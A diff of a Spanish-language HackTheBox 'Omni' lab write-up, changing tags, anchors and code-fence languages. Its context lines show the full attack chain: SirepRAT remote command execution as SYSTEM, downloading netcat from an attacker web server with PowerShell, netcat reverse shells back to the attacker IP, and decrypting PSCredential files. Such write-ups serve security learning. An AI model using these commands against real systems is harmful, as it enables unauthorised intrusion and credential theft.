@@ -3,6 +3,7 @@ layout      : post
 title       : "HackTheBox - Omni"
 image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/banneromni.png
 category    : [ htb ]
+tags        : [ IoT, powershell ]
 ---
 Máquina IoT nivel fácil. Romperemos protocolos para ejecutar comandos en el sistema, enumerando mucho tendremos credenciales, usaremos portales o.O para ejecutar comandos de nuevo. Jugaremos con la clase PSCredential de PowerShell para obtener las flags.
 
@@ -24,23 +25,23 @@ Ehhh no, no hemos terminado, las flags están encriptadas, nos romperemos un poc
 
 Tendremos 3 fases. Enumeración, explotación y escalada de privilegios :)
 
-1. [Enumeración](#enumeración)
-2. [Explotación](#explotación)
+1. [Enumeración](#enumeracion)
+2. [Explotación](#explotacion)
 3. [Escalada de privilegios](#escalada-de-privilegios)
 
 ...
 
-## Enumeración [#](#enumeración) {#enumeración}
+## Enumeración [#](#enumeracion) {#enumeracion}
 
 Empezaremos realizando un escaneo de puertos sobre la máquina para así saber que servicios está corriendo.
 
-```sh
+```bash
 –» nmap -p- --open -v -Pn 10.10.10.204
 ```
 
 Pero va algo lento, agregando `-T` va igual, podemos agregar `--min-rate` y ver si va más rápido. (Sin embargo es importante hacer un escaneo total, sin cambios, así vaya lento, que nos permita ver si obviamos/pasamos algún puerto.
 
-```sh
+```bash
 –» nmap -p- --open -v -Pn --min-rate=2000 10.10.10.204 -oG initScan
 ```
 
@@ -54,7 +55,7 @@ Pero va algo lento, agregando `-T` va igual, podemos agregar `--min-rate` y ver 
 | -v         | Permite ver en consola lo que va encontrando                                                             |
 | -oG        | Guarda el output en formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |
 
-```sh
+```bash
 –» cat initScan 
 # Nmap 7.80 scan initiated Wed Oct 28 10:58:58 2020 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10.10.10.204
 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
@@ -72,7 +73,7 @@ Obtenemos la siguiente información:
 
 Procedemos a nuestro escaneo de versiones y scripts para obtener información más detallada de cada servicio:
 
-```sh
+```bash
 –» nmap -p135,5985,8080,29817,29819 -sC -sV -Pn 10.10.10.204 -oN portScan
 ```
 
@@ -83,7 +84,7 @@ Procedemos a nuestro escaneo de versiones y scripts para obtener información m�
 | -sV       | Nos permite ver la versión del servicio                |
 | -oN       | Guarda el output en un archivo                         |
 
-```sh
+```bash
 –» cat portScan 
 # Nmap 7.80 scan initiated Wed Oct 28 11:16:31 2020 as: nmap -p135,5985,8080,29817,29819 -sC -sV -Pn -oN portScan 10.10.10.204
 Nmap scan report for 10.10.10.204
@@ -128,7 +129,7 @@ Pero no nos funcionan... Buscando exploits encontramos un proyecto interesante.
 
 ...
 
-## Explotación [#](#explotación) {#explotación}
+## Explotación [#](#explotacion) {#explotacion}
 
 * [Herramienta SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT)
 * [Articulo en español abordandola](https://www.hackplayers.com/2019/03/exploit-para-ownear-Windows-IoT-Core.html)
@@ -141,7 +142,7 @@ Pero no nos funcionan... Buscando exploits encontramos un proyecto interesante.
 
 Podemos iniciar probando que usuario somos y validar su output:
 
-```sh
+```bash
 –» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c echo {{userprofile}}"
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
 <OutputStreamResult | type: 11, payload length: 30, payload peek: 'C:\Data\Users\DefaultAccount'>
@@ -152,7 +153,7 @@ Perfecto, tenemos ejecución de comandos. En la fila `<OutputStreamResult>` vemo
 
 El programa tiene la opción de ejecutar los comandos como SYSTEM (simplemente quitamos `--as_logged_on_user`).
 
-```sh
+```bash
 –» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c echo {{userprofile}}"
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
 <OutputStreamResult | type: 11, payload length: 22, payload peek: 'C:\Data\Users\System'>
@@ -161,7 +162,7 @@ El programa tiene la opción de ejecutar los comandos como SYSTEM (simplemente q
 
 ¿En qué directorio estamos parados?
 
-```sh
+```powershell
 –» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c echo %cd%" --v
 ---------
 C:\windows\system32
@@ -174,7 +175,7 @@ C:\windows\system32
 
 * Con `--v` hacemos el típico **verbose**, nos sirve si queremos hacer `dir` para ver todo el output:
 
-```sh
+```powershell
 –» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c dir ..\..\"" --v
 ---------
  Volume in drive C is MainOS
@@ -202,17 +203,17 @@ Vemos la estructura raíz del sistema... Perfecto, intentemos subir el binario *
 
 Recientemente vimos una ruta hacia `C:\Data\Users\DefaultAccount`, podemos usarla para subir el binario. Primero montamos un servidor web con Python donde este `nc.exe`:
 
-```sh
+```bash
 –» python3 -m http.server
 ```
 
-```sh
+```bash
 –» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell IWR -uri http://10.10.15.30:8000/nc.exe -OutFile C:\Data\Users\DefaultAccount\nc.exe"
 ```
 
 Validamos:
 
-```sh
+```powershell
 –» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c dir C:\Data\Users\DefaultAccount" --v
 ---------
  Volume in drive C is MainOS
@@ -241,19 +242,19 @@ Validamos:
 
 Nos ponemos en escucha (`nc -nvlp 4433`) y ejecutamos:
 
-```sh
+```bash
 –» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c C:\Data\Users\DefaultAccount\nc.exe 10.10.15.30 4433 -e cmd.exe" --v
 ```
 
 Acá tenemos problemas con la versión de `nc.exe`, así que descargaremos las 2 y probaremos con las 2... Volvemos a subir la de 32 Bits, pero no funciona, probemos con la de 64 :)
 
-```sh
+```bash
 –» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell IWR -uri http://10.10.15.30:8000/nc64.exe -OutFile C:\Data\Users\DefaultAccount\nc64.exe"
 ```
 
 Validemos de una:
 
-```sh
+```bash
 –» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c C:\Data\Users\DefaultAccount\nc64.exe 10.10.15.30 4433 -e cmd.exe" --v
 ```
 
@@ -291,10 +292,10 @@ Buscando y leyendo durante bastante tiempo, intentando solucionar problemas, des
 
 Curiosamente muchas personas también se habían estancado ahí, los demás indicaban que era necesario encontrar otro archivo en el que van a haber cosas bonitas... Leyendo como podemos apoyarnos de `PowerShell` para buscar objetos rápidamente encontré esta manera:
 
-* [Buscar de manera recursiva PowerShell](https://stackoverflow.com/questions/8677628/recursive-file-search-using-powershell)
-* [... y exclusiva](https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/)
+* [Buscar de manera recursiva PowerShell](https://stackoverflow.com/questions/8677628/recursive-file-search-using-powershell).
+* [... y exclusiva](https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/).
 
-```sh
+```powershell
 # Guardamos el año en una variable
 $date = Get-Date -Year 2019
 # Le indicamos que busque en la ruta actual (**.**), donde nos muestre los archivos ocultos (**-force**), entre y busque en cada carpeta (**-recurse**) y tenga una fecha mayor o igual a la variable que guardamos
@@ -307,7 +308,7 @@ Con esto estuve rondando algunas carpetas, hasta que busque en la misma relacion
 
 Encontramos este archivo llamado `r.bat`, que quieras o no parece sospechoso, por la fecha y por su nombre, veamos si encontramos algo ahí.
 
-```sh
+```powershell
 PS C:\Program Files> type "C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat"
 @echo off
 
@@ -343,7 +344,7 @@ Dandole una pasada vemos un apartado donde podemos ingresar comandos en el siste
 
 **Veamos la diferencia entre SYSTEM y ADMINISTRATOR:**
 
-```sh
+```powershell
 # Sesión que tenemos actualmente.
 C:\Data\Users\app>echo %userprofile%
 C:\Data\Users\System
@@ -377,7 +378,7 @@ Access is denied.
 
 Ahora juguemos con el portal:
 
-```sh
+```powershell
 Command> echo %userprofile%
 C:\Data\Users\administrator 
 ```
@@ -390,7 +391,7 @@ Listos, tamos como **administrator**, veamos si ahora si podemos jugar con las f
 
 De las búsquedas y lecturas que ya había hecho, encontré este comando que toma la estructura del archivo y la convierte en un objeto del sistema, del cual podemos ver el usuario y contraseña que tenga asignada:
 
-```sh
+```powershell
 $credential = Import-CliXml -Path  <PathToXml>\MyCredential.xml
 ```
 
@@ -404,7 +405,7 @@ Entonces podemos usar esto para validar:
 
 También de la lectura previa entendí que si no somos el propietario del archivo, lo más probable es que obtengamos algún tipo de error, en nuestro caso al intentar jugar con `user.txt` y `iot-admin.xml`, obtenemos:
 
-```sh
+```powershell
 PS C:\Data\Users\app> $credential = Import-CliXml -Path c:\Data\Users\app\user.txt
 Import-CliXml : Error occurred during a cryptographic operation.
 At line:1 char:15
@@ -428,7 +429,7 @@ Hacemos el mismo procedimiento que con el usuario **administrator**. Entramos al
 
 > Realmente no creo que sean necesarias las reverse shell, ya que podemos ejecutar la linea desde el mismo portal, pero yo que se, me gusta :)
 
-```sh
+```powershell
 Command> echo %userprofile%
 C:\Data\Users\app 
 
@@ -438,13 +439,13 @@ Access is denied.
 
 Muy bien, entonces movamos el binario a una carpeta de la que sea propietario el usuario **app**. Lo hice con la sesión que tenía abierta de **SYSTEM**, cerré la de **administrator** :(
 
-```sh
+```powershell
 C:\Data\Users\app\Videos>copy c:\Data\users\DefaultAccount\nc64.exe nc64.exe
 ```
 
 Y ahora en el portal:
 
-```sh
+```powershell
 >c:\Data\Users\app\Videos\nc64.exe 10.10.14.188 4435 -e cmd.exe
 ```
 
@@ -454,7 +455,7 @@ Veamos la flag de `user.txt`:
 
 Bien, ahora quiero probar si hice todo al revés o si daba igual <>_<>
 
-```sh
+```powershell
 PS C:\Data\Users\app> $credential = Import-CliXml -Path c:\Data\Users\app\iot-admin.xml
 $credential = Import-CliXml -Path c:\Data\Users\app\iot-admin.xml
 PS C:\Data\Users\app> $credential.GetNetworkCredential().Username
